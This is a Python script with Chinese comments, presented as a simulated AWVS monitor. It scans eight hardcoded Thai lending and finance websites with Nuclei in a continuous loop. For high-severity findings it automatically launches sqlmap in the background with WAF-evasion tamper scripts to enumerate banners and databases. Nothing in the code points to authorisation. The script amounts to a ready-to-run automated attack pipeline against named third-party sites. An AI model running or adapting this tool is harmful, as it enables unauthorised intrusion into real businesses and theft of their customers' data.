#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
模拟AWVS实时监控系统 - 使用Nuclei + SQLMap实现
当发现高危漏洞时立即触发SQLMap验证攻击
"""

import requests
import time
import json
import threading
import subprocess
import sqlite3
import os
import sys
from datetime import datetime

class SimulatedAWVSMonitor:
    """模拟AWVS实时监控器"""

    def __init__(self):
        self.targets = [
            "https://www.quickcash.in.th",
            "https://ngoenmun.com",
            "https://peacoop.or.th",
            "https://www.moneycat.co.th",
            "https://mula-x.com",
            "https://www.rocket-cash.com",
            "https://kloan.co.th",
            "https://www.ngerntidlor.com"
        ]
        self.db_path = "simulated_awvs_monitoring.db"
        self.nuclei_path = f"{os.environ.get('GOPATH', '')}/bin/nuclei.exe"
        self.sqlmap_path = "sqlmap"
        self.monitoring = False
        self.high_risk_threshold = 7  # CVSS 7.0以上为高危
        self.scan_interval = 300  # 5分钟扫描一次

        # 初始化数据库
        self.init_database()

    def init_database(self):
        """初始化监控数据库"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                scan_time TEXT NOT NULL,
                vulnerability_count INTEGER DEFAULT 0,
                high_risk_count INTEGER DEFAULT 0,
                critical_risk_count INTEGER DEFAULT 0,
                vulnerabilities TEXT,
                status TEXT DEFAULT 'pending'
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS triggered_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                vulnerability TEXT NOT NULL,
                severity TEXT,
                nuclei_template TEXT,
                sqlmap_command TEXT,
                start_time TEXT,
                status TEXT DEFAULT 'pending',
                result_file TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        conn.commit()
        conn.close()

    def nuclei_scan_target(self, target_url):
        """使用Nuclei扫描单个目标"""
        try:
            # 创建输出文件名
            safe_name = target_url.replace("https://", "").replace("http://", "").replace("/", "_")
            output_file = f"nuclei_scan_{safe_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

            # 构建Nuclei命令
            nuclei_cmd = [
                self.nuclei_path,
                "-target", target_url,
                "-severity", "critical,high,medium",
                "-rate-limit", "10",
                "-timeout", "30",
                "-jsonl",
                "-o", output_file,
                "-silent"
            ]

            print(f"[+] 启动Nuclei扫描: {target_url}")

            # 执行扫描
            result = subprocess.run(
                nuclei_cmd,
                capture_output=True,
                text=True,
                timeout=300  # 5分钟超时
            )

            if result.returncode == 0:
                print(f"[+] Nuclei扫描完成: {target_url}")
                return self.parse_nuclei_results(output_file, target_url)
            else:
                print(f"[-] Nuclei扫描失败: {target_url}")
                print(f"    错误: {result.stderr}")
                return None

        except subprocess.TimeoutExpired:
            print(f"[-] Nuclei扫描超时: {target_url}")
            return None
        except Exception as e:
            print(f"[-] Nuclei扫描异常: {target_url} - {str(e)}")
            return None

    def parse_nuclei_results(self, output_file, target_url):
        """解析Nuclei扫描结果"""
        vulnerabilities = []
        high_risk_count = 0
        critical_risk_count = 0

        try:
            if os.path.exists(output_file):
                with open(output_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        if line.strip():
                            try:
                                vuln = json.loads(line.strip())

                                # 确定严重程度
                                severity = vuln.get('info', {}).get('severity', 'unknown')

                                # 计算CVSS评分（模拟）
                                cvss_score = self.calculate_cvss_score(severity, vuln)

                                vuln_data = {
                                    'template_id': vuln.get('template-id', 'unknown'),
                                    'template_name': vuln.get('info', {}).get('name', 'Unknown'),
                                    'severity': severity,
                                    'cvss_score': cvss_score,
                                    'description': vuln.get('info', {}).get('description', ''),
                                    'match': vuln.get('matched-at', ''),
                                    'vulnerability_class': self.classify_vulnerability(vuln)
                                }

                                vulnerabilities.append(vuln_data)

                                # 统计高危漏洞
                                if cvss_score >= 9.0:
                                    critical_risk_count += 1
                                elif cvss_score >= 7.0:
                                    high_risk_count += 1

                            except json.JSONDecodeError:
                                continue

        except Exception as e:
            print(f"[-] 解析Nuclei结果失败: {str(e)}")

        return {
            'vulnerabilities': vulnerabilities,
            'total_count': len(vulnerabilities),
            'high_risk_count': high_risk_count,
            'critical_risk_count': critical_risk_count
        }

    def calculate_cvss_score(self, severity, vuln):
        """计算CVSS评分（模拟）"""
        severity_scores = {
            'critical': 9.5,
            'high': 7.5,
            'medium': 5.5,
            'low': 3.5,
            'info': 1.0
        }

        base_score = severity_scores.get(severity, 5.0)

        # 根据漏洞类型调整评分
        template_id = vuln.get('template-id', '').lower()
        if any(x in template_id for x in ['sqli', 'sql-injection', 'blind-sqli']):
            base_score = min(10.0, base_score + 1.5)
        elif any(x in template_id for x in ['rce', 'remote-code', 'command-injection']):
            base_score = min(10.0, base_score + 2.0)
        elif any(x in template_id for x in ['xss', 'cross-site']):
            base_score = min(10.0, base_score + 0.5)

        return base_score

    def classify_vulnerability(self, vuln):
        """分类漏洞类型"""
        template_id = vuln.get('template-id', '').lower()
        tags = vuln.get('info', {}).get('tags', [])

        if any(x in template_id for x in ['sqli', 'sql', 'injection']):
            return 'sql_injection'
        elif any(x in template_id for x in ['xss', 'cross-site']):
            return 'xss'
        elif any(x in template_id for x in ['ssrf', 'server-side']):
            return 'ssrf'
        elif any(x in template_id for x in ['rce', 'remote', 'command']):
            return 'remote_code_execution'
        elif any(x in template_id for x in ['lfi', 'file-inclusion']):
            return 'file_inclusion'
        elif 'exposure' in tags or 'disclosure' in tags:
            return 'information_disclosure'
        else:
            return 'other'

    def trigger_sqlmap_attack(self, target_url, vulnerability):
        """触发SQLMap验证攻击"""
        cvss_score = vulnerability.get('cvss_score', 0)
        vuln_type = vulnerability.get('vulnerability_class', 'unknown')
        template_id = vulnerability.get('template_id', 'unknown')
        match_url = vulnerability.get('match', target_url)

        # 只对SQL注入相关漏洞触发SQLMap
        if 'sql' in vuln_type.lower() or 'sqli' in template_id.lower():
            sql_cmd = f'''
            {self.sqlmap_path} -u "{match_url}" \\
            --batch --random-agent --tamper="space2comment,randomcase" \\
            --level=3 --risk=2 --time-sec=30 --threads=3 \\
            --banner --current-db --dbs --timeout=60 \\
            --output-dir="sqlmap_simulated_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            '''
        else:
            # 对于其他漏洞，尝试通用SQLMap扫描
            sql_cmd = f'''
            {self.sqlmap_path} -u "{target_url}" \\
            --batch --random-agent --tamper="space2comment" \\
            --level=2 --risk=1 --time-sec=20 --threads=2 \\
            --banner --current-db --timeout=45 \\
            --output-dir="sqlmap_simulated_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            '''

        # 记录到数据库
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT INTO triggered_attacks
            (target_url, vulnerability, severity, nuclei_template, sqlmap_command, start_time, status)
            VALUES (?, ?, ?, ?, ?, ?, 'pending')
        ''', (
            target_url,
            json.dumps(vulnerability),
            vulnerability.get('severity', 'unknown'),
            vulnerability.get('template_id', 'unknown'),
            sql_cmd,
            datetime.now().isoformat()
        ))

        attack_id = cursor.lastrowid
        conn.commit()
        conn.close()

        print(f"[!] 触发SQLMap验证攻击!")
        print(f"    目标: {target_url}")
        print(f"    漏洞: {vulnerability.get('template_name')}")
        print(f"    严重程度: {vulnerability.get('severity')}")
        print(f"    CVSS评分: {cvss_score}")
        print(f"    攻击ID: {attack_id}")

        # 后台执行SQLMap
        try:
            subprocess.Popen(
                sql_cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"[+] SQLMap攻击已启动 (后台运行)")

        except Exception as e:
            print(f"[-] SQLMap启动失败: {str(e)}")

            # 更新数据库状态
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE triggered_attacks
                SET status = 'failed'
                WHERE id = ?
            ''', (attack_id,))
            conn.commit()
            conn.close()

    def monitor_single_target(self, target_url):
        """监控单个目标"""
        print(f"\n[*] 开始监控: {target_url}")

        # 执行Nuclei扫描
        scan_results = self.nuclei_scan_target(target_url)
        if not scan_results:
            print(f"[-] 扫描失败: {target_url}")
            return

        total_vulns = scan_results['total_count']
        high_count = scan_results['high_risk_count']
        critical_count = scan_results['critical_risk_count']

        print(f"[+] 扫描完成: {target_url}")
        print(f"    总漏洞数: {total_vulns}")
        print(f"    高危漏洞: {high_count}")
        print(f"    严重漏洞: {critical_count}")

        # 记录到数据库
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT INTO scan_results
            (target_url, scan_time, vulnerability_count, high_risk_count,
             critical_risk_count, vulnerabilities, status)
            VALUES (?, ?, ?, ?, ?, ?, 'completed')
        ''', (
            target_url,
            datetime.now().isoformat(),
            total_vulns,
            high_count,
            critical_count,
            json.dumps(scan_results['vulnerabilities'])
        ))

        conn.commit()
        conn.close()

        # 触发SQLMap验证攻击（只针对高危漏洞）
        high_risk_vulns = [
            vuln for vuln in scan_results['vulnerabilities']
            if vuln['cvss_score'] >= self.high_risk_threshold
        ]

        for vuln in high_risk_vulns[:3]:  # 最多触发3个SQLMap攻击
            self.trigger_sqlmap_attack(target_url, vuln)
            time.sleep(10)  # 间隔10秒

    def start_monitoring(self):
        """开始监控所有目标"""
        print("[*] 模拟AWVS实时监控系统启动")
        print("=" * 60)
        print("[*] 监控目标:")
        for target in self.targets:
            print(f"    - {target}")
        print(f"[*] 高危阈值: CVSS {self.high_risk_threshold}+")
        print(f"[*] 扫描间隔: {self.scan_interval//60}分钟")
        print("=" * 60)

        self.monitoring = True

        try:
            while self.monitoring:
                print(f"\n[*] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - 开始新一轮扫描")

                # 并发扫描所有目标
                threads = []
                for target in self.targets:
                    thread = threading.Thread(
                        target=self.monitor_single_target,
                        args=(target,)
                    )
                    threads.append(thread)
                    thread.start()

                # 等待所有扫描完成
                for thread in threads:
                    thread.join()

                if self.monitoring:
                    print(f"\n[*] 等待 {self.scan_interval//60} 分钟后进行下一轮扫描...")
                    time.sleep(self.scan_interval)

        except KeyboardInterrupt:
            print("\n\n[!] 用户中断监控")
            self.monitoring = False
        finally:
            print("\n[*] 监控结束，数据已保存到数据库")
            self.print_summary()

    def print_summary(self):
        """打印监控总结"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # 扫描结果统计
        cursor.execute('''
            SELECT COUNT(*) FROM scan_results WHERE status = 'completed'
        ''')
        completed_scans = cursor.fetchone()[0]

        cursor.execute('''
            SELECT SUM(high_risk_count), SUM(critical_risk_count) FROM scan_results
        ''')
        high_risk_total = cursor.fetchone()[0] or 0
        critical_risk_total = cursor.fetchone()[1] or 0

        # 触发攻击统计
        cursor.execute('''
            SELECT COUNT(*) FROM triggered_attacks
        ''')
        triggered_attacks = cursor.fetchone()[0]

        print("\n[*] 监控总结报告")
        print("=" * 50)
        print(f"[+] 完成扫描: {completed_scans} 个")
        print(f"[!] 发现高危漏洞: {high_risk_total} 个")
        print(f"[!!] 发现严重漏洞: {critical_risk_total} 个")
        print(f"[->] 触发SQLMap验证: {triggered_attacks} 次")
        print("=" * 50)

        # 显示最近的高危漏洞
        cursor.execute('''
            SELECT target_url, vulnerability, severity, created_at
            FROM triggered_attacks
            ORDER BY created_at DESC
            LIMIT 5
        ''')

        recent_attacks = cursor.fetchall()
        if recent_attacks:
            print("\n[*] 最近触发的SQLMap验证:")
            for attack in recent_attacks:
                vuln_data = json.loads(attack[1])
                print(f"    - {attack[0]}")
                print(f"      漏洞: {vuln_data.get('template_name')}")
                print(f"      严重程度: {attack[2]}")
                print(f"      时间: {attack[3][:19]}")

        conn.close()

def main():
    """主函数"""
    monitor = SimulatedAWVSMonitor()

    print("模拟AWVS实时监控系统")
    print("=" * 50)
    print("[*] 配置检查...")
    print(f"[*] Nuclei路径: {monitor.nuclei_path}")
    print(f"[*] 监控目标: {len(monitor.targets)} 个")
    print(f"[*] 数据库: {monitor.db_path}")

    # 检查Nuclei是否可用
    if not os.path.exists(monitor.nuclei_path):
        print(f"[-] Nuclei未找到: {monitor.nuclei_path}")
        print("请确保Nuclei已安装并且在GOPATH/bin目录中")
        return

    print("\n选择操作:")
    print("1. 开始实时监控")
    print("2. 单次测试扫描")
    print("3. 查看历史记录")
    print("4. 退出")

    try:
        choice = input("\n请选择 (1-4): ").strip()

        if choice == '1':
            monitor.start_monitoring()
        elif choice == '2':
            target = input("请输入目标URL: ").strip()
            if target:
                monitor.monitor_single_target(target)
        elif choice == '3':
            monitor.print_summary()
        elif choice == '4':
            print("退出监控程序")
        else:
            print("无效选择")

    except KeyboardInterrupt:
        print("\n程序退出")

if __name__ == "__main__":
    main()